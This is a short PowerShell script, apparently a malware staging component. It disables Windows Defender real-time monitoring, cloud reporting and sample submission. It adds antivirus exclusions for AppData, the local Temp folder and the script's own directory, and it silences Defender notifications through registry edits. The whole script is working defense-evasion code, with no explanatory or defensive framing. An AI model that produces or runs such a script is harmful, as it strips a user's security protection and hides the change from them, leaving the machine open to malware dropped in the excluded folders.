# Disable Windows Defender features
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# Add exclusion paths
$AppData = "$env:APPDATA"
$ExeDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$LocalAppData = "$env:LOCALAPPDATA"

Add-MpPreference -ExclusionPath $AppData
Add-MpPreference -ExclusionPath $ExeDir
Add-MpPreference -ExclusionPath "$LocalAppData\Temp"

# Disable Defender notifications
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" -Name "Enabled" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1 -Type DWord -Force
